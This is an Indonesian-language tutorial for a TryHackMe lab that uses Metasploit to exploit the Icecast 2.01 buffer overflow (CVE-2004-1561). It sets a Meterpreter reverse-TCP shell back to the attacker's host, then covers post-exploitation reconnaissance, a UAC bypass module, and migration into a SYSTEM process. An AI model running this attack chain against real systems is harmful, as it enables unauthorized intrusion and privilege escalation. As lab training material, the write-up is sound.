# Memakai Metasploit

Persiapan Metasploit:
```sh
sudo systemctl start postgresql

sudo msfdb init

sudo msfconsole
```

Didalam metasploit:
```sh
db_status

workspace -a intro-metasploit

workspace
```

Search module:
```sh
search

search x86/shell_reverse_tcp

search x86/shell/reverse_tcp

```

## Eksploitasi Vulnerability Icecast TryHackMe
https://tryhackme.com/room/rpmetasploit

Icecast adalah tools untuk internet audio streaming, contoh penggunaanya adalah internet radio.

Icecast pernah memiliki vulnerability Remote Code Execution (RCE)
[CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/)  

Buffer overflow dengan cara mengirimkan 32 header HTTP ke server icecast versi 2.01 (hanya bekerja di Windows).

```sh
# Gunakan Nmap pada Metasploit
db_nmap -sV -T4 <IP_TARGET>

# cek isi database
hosts
services
vulns
```

Sekarang set eksploit dan payload.  
```sh
# gunakan file eksploitasi icecast versi 2.01
search icecast
use 0

# set payload, contohnya gunakan meterpreter
set payload windows/meterpreter/reverse_tcp

# lihat isi options
options

# isi yang dibutuhkan
set rhosts <IP_TARGET>
set lhost <IP_KAMU>

# jalankan eksploitasi
exploit
```

Sebelum menggunakan Meterpreter
```sh
# background process
bg

# lihat daftar session
sessions

# berinteraksi dengan session
sessions -i <Id>
```

Menggunakan Meterpreter
```sh
# informasi tentang sistem
sysinfo

# informasi tentang user
getuid

# informasi proses yang berjalan
ps

# berpindah ke proses lain, untuk mencari batu pijakan yang kuat
migrate <PID>

# get help
help
```

Post Exploitation dengan Meterpreter
```sh
# eksekusi post modul Metasploit
run post/windows/gather/checkvm

# exploit suggester
run post/multi/recon/local_exploit_suggester
run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
```
Exploit suggester juga memberitahukan tingkat keefektifan dari eksploit yang ditampilkan:
- Vulnerable: setelah dicek, target terbukti kuat memiliki vulnerability.
- Appears: target memiliki versi resource yang vulnerable.
- Detected: target memiliki vulnerable service yang sedang beroperasi, namun tidak dapat dicek.

Privilege Escalation
```sh
#background meterpreter
bg

# ambil salah satu informasi dari local_exploit_suggester
use exploit/windows/local/bypassuac_dotnet_profiler

# set options
set session <ID_SESSION>
set lhost <IP_KAMU>

# exploit
exploit

# percobaan migrasi ke proses lain
ps

# cari PID svchost.exe dengan kepemilikan NT Authority
migrate <PID>

# Escalated?
getuid
```


## Modul
```sh
# primer
/usr/share/metasploit-framework/modules/

# sekunder (untuk menyimpan custom module)
~/.msf4/modules/
```

Menggunakan modul, sekali sesi
```sh
# teknik 1:
msfconsole -m /lokasi/folder/modul

# teknik 2:
msfconsole
loadpath /lokasi/folder/modul

```